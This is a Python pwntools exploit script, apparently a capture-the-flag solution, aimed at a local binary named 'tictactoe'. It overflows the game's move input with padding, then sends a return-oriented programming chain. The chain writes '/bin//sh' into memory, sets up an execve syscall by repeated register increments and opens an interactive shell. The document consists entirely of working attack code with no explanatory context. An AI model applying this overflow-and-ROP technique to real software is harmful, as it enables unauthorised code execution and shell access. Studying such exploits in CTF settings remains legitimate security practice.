from struct import pack
from pwn import context, process

context.log_level = "debug"
io = process("./tictactoe")

p = b"(2,2)" + (143 - 5) * b'a' + b"\x01" + (152 - 144) * b'a'

p += pack('<Q', 0x0000000000407228) # pop rsi ; ret
p += pack('<Q', 0x00000000004a60e0) # @ .data
p += pack('<Q', 0x000000000043e52c) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000407228) # pop rsi ; ret
p += pack('<Q', 0x00000000004a60e8) # @ .data + 8
p += pack('<Q', 0x0000000000439070) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046d7b1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004017b6) # pop rdi ; ret
p += pack('<Q', 0x00000000004a60e0) # @ .data
p += pack('<Q', 0x0000000000407228) # pop rsi ; ret
p += pack('<Q', 0x00000000004a60e8) # @ .data + 8
p += pack('<Q', 0x000000000043dbb5) # pop rdx ; ret
p += pack('<Q', 0x00000000004a60e8) # @ .data + 8
p += pack('<Q', 0x0000000000439070) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000463af0) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000402bf4) # syscall

io.recvuntil("): ")
io.sendline(p)
io.interactive()
